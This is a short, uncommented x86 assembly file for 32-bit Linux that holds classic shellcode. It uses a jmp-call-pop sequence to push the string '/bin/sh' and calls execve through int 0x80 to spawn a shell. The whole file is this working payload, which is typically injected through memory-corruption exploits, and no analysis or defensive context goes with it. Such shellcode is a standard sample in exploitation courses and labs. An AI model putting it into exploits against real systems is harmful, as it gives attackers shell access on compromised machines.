[section .data]

global _start

_start:
	jmp sh
se:
	pop ebx
	xor eax, eax
	mov al, 11
	xor ecx, ecx
	xor edx, edx
	int 0x80
sh:
	call se
	db '/bin/sh', 0
